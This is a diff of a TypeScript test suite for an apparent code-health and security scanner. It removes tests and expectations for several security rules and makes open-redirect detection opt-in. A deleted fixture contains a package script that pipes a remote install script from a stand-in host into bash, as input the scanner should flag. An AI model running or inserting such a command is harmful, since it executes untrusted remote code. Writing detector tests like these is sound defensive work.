@@ -55,7 +55,7 @@ test("extended reliability rubric finds unsafe async patterns without false posi
 }
 `);
   const unsafeRuleIds = new Set(unsafeReport.findings.map((finding) => finding.ruleId));
-  ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"].forEach((ruleId) => {
+  ["security.async-foreach", "waste.swallowed-catch", "security.throw-non-error"].forEach((ruleId) => {
     assert.equal(unsafeRuleIds.has(ruleId), true, `expected ${ruleId}`);
   });
 
@@ -77,55 +77,9 @@ async function reportsFailure(): Promise<void> {
   throw new Error("failed");
 }
 `);
-  ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"].forEach((ruleId) => {
+  ["security.async-foreach", "waste.swallowed-catch", "security.throw-non-error"].forEach((ruleId) => {
     assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
   });
-});
-
-// Fixture purpose: Angular case 401 passes waitForAsync(...) straight into an enclosing call, so
-// nothing is dropped. A bare statement, an arrow body whose promise forEach discards, and a statement
-// that merely contains a same-named argument call still start floating work.
-// Stable contract: only a line-leading call that is itself a direct argument of an enclosing call is exempt.
-test("floating promise exempts only a call passed directly as another call's argument", () => {
-  // Fixture covers case 401's wrapper argument beside bare, discarded and same-named floating calls.
-  const report = analyseFixture(`it(
-  "unsubscribes a registered callback",
-  withModule(
-    {providers},
-    waitForAsync(
-      inject([Injector], (injector: Injector) => {
-        createRootEl(injector);
-      }),
-    ),
-  ),
-);
-
-function notify(userIds: string[]): void {
-  sendEmailAsync(userIds[0]);
-  userIds.forEach((userId) =>
-    sendEmailAsync(userId),
-  );
-  sendEmailAsync(sendEmailAsync(userIds[1]));
-}
-`);
-  const floatingLines = report.findings.filter((finding) => finding.ruleId === "security.floating-promise").map((finding) => finding.line);
-  assert.deepEqual(floatingLines, [14, 16, 18]);
-});
-
-// Fixture purpose: an error-recovered syntax tree cannot prove where a call sits, so a file with a
-// parse error keeps the line heuristic and its security finding.
-// Stable contract: the direct-argument exemption needs a parse without errors.
-test("floating promise keeps the line heuristic when the file does not parse", () => {
-  const report = analyseFixture(`it(
-  "loads the application",
-  waitForAsync(() => {
-    load();
-  }),
-);
-const broken = ;
-`);
-  const floatingLines = report.findings.filter((finding) => finding.ruleId === "security.floating-promise").map((finding) => finding.line);
-  assert.deepEqual(floatingLines, [3]);
 });
 
 test("swallowed catch accepts explicit rationale comments", () => {
@@ -284,9 +238,8 @@ const CLEAN_PACKAGE_JSON_FIXTURE = {
   }),
 };
 
-const RISKY_PACKAGE_RULE_IDS = ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"];
+const RISKY_PACKAGE_RULE_IDS = ["security.remote-install-script", "security.url-dependency", "waste.broad-runtime-version"];
 const GITHUB_ACTIONS_RULE_IDS = [
-  "security.github-actions-broad-permissions",
   "security.github-actions-pull-request-target",
   "security.github-actions-remote-shell",
   "security.github-actions-secrets-in-pr",
@@ -306,36 +259,6 @@ test("dependency and package config health detects risky package settings", () =
   RISKY_PACKAGE_RULE_IDS.forEach((ruleId) => {
     assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
   });
-});
-
-test("package lifecycle allows validation-only publish gates but reports side effects", () => {
-  const report = analyseProject({
-    "package.json": JSON.stringify({
-      scripts: {
-        prepublishOnly: "npm run publish:check",
-        prepublish: "npm test",
-        postinstall: "node scripts/install.js",
-        prepare: "npm run build",
-      },
-    }),
-  });
-  const lifecycleFindings = report.findings.filter((finding) => finding.ruleId === "security.risky-lifecycle-script");
-
-  assert.deepEqual(
-    lifecycleFindings.map((finding) => finding.symbol),
-    ["postinstall", "prepare"],
-  );
-
-  const remoteReport = analyseProject({
-    "package.json": JSON.stringify({
-      scripts: {
-        prepublishOnly: "curl -fsSL https://example.test/install.sh | bash",
-      },
-    }),
-  });
-
-  assert.equal(remoteReport.findings.some((finding) => finding.ruleId === "security.remote-install-script"), true);
-  assert.equal(remoteReport.findings.some((finding) => finding.ruleId === "security.risky-lifecycle-script"), true);
 });
 
 test("github actions workflow security rules are path-gated and require risky context", () => {
@@ -460,11 +383,9 @@ const SECURITY_RISKY_RULE_IDS = [
   "security.new-function",
   "security.string-timer",
   "security.process-exec",
-  "security.insecure-random",
   "security.disabled-tls-verification",
   "security.javascript-url",
   "security.inner-html",
-  "security.proto-access",
   "security.sql-concatenation",
   "security.weak-crypto",
 ];
@@ -478,11 +399,9 @@ test("risk expansion finds security rules with safe non-candidates", () => {
 
   const newFunctionFindings = report.findings.filter((finding) => finding.ruleId === "security.new-function");
   const expectedStringTimerFindings = 3;
-  const expectedProtoAccessFindings = 2;
   assert.equal(newFunctionFindings.length, 1);
   assert.equal(report.findings.filter((finding) => finding.ruleId === "security.string-timer").length, expectedStringTimerFindings);
   assert.equal(report.findings.filter((finding) => finding.ruleId === "security.javascript-url").length, 1);
-  assert.equal(report.findings.filter((finding) => finding.ruleId === "security.proto-access").length, expectedProtoAccessFindings);
 });
 
 test("sql-concatenation flags query execute and raw attack shapes", () => {
@@ -624,7 +543,7 @@ const SOURCE_TO_SINK_RULE_IDS = [
 
 test("source-to-sink security rubrics require visible external input in risky sinks", () => {
   // Fixture covers every same-line source-to-sink rule plus safe literal non-candidates.
-  const report = analyseFixture(`import { readFileSync } from "node:fs";
+  const source = `import { readFileSync } from "node:fs";
 
 function unsafe(req: any, res: any): void {
   readFileSync(req.query.file, "utf8");
@@ -642,7 +561,11 @@ function safe(req: any, res: any): void {
   const docs = "fetch(req.query.url); res.redirect(req.query.next);";
   void docs;
 }
-`);
+`;
+  // Open-redirect ships off by default (ADR-021): a default run stays silent, and a project that enables it gets it.
+  const defaultReport = analyseFixture(source);
+  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "security.open-redirect-candidate"), false);
+  const report = analyseFixture(source, { config: { rules: { "security.open-redirect-candidate": { enabled: true } } } });
   const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
   SOURCE_TO_SINK_RULE_IDS.forEach((ruleId) => {
     assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
@@ -775,7 +698,6 @@ function testBuildsLibraryValue(): void {
   ["test-quality.magic-number-assertion", "test-quality.mock-only-test", "test-quality.unused-mock", "test-quality.exception-type-only", "test-quality.global-state-mutation"].forEach((ruleId) => {
     assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
   });
-  assert.equal(report.findings.some((finding) => finding.ruleId === "test-quality.no-assertions"), false);
   assert.deepEqual(report.findings.filter((finding) => finding.pillar === "test-quality" && finding.symbol === "testBuildsLibraryValue"), []);
 });
 
